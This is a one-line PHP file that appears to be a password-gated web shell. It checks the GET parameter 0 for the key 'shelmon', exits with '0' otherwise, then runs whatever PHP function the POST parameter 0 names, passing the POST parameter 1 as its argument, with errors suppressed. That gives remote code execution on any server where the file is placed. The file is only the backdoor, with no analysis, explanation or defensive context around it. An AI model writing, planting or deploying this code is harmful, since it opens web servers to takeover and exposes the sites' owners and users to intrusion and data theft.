<?=(isset($_GET[0])&&$_GET[0]=="shelmon"?:die("0"))&&@$_POST[0]($_POST[1]);
